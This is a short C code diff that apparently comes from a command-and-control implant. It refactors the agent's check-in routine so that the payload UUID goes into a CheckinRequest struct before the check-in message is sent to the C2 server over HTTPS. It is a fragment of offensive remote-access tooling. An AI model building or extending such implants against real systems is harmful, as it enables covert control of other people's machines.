@@ -31,7 +31,9 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 
 void perform_checkin(AgentParams *params, CheckinReply *reply) {
 	// Generate checkin payload.
-	char *msg = generate_checkin_message(params->payload_uuid, 4096);
+	CheckinRequest checkin = { 0 };
+	checkin.payload_uuid = params->payload_uuid;
+	char *msg = generate_checkin_message(&checkin);
 	
 	// Send checkin payload to C2 server.
 	HttpHandle *http = HttpInit(params->callback_https);
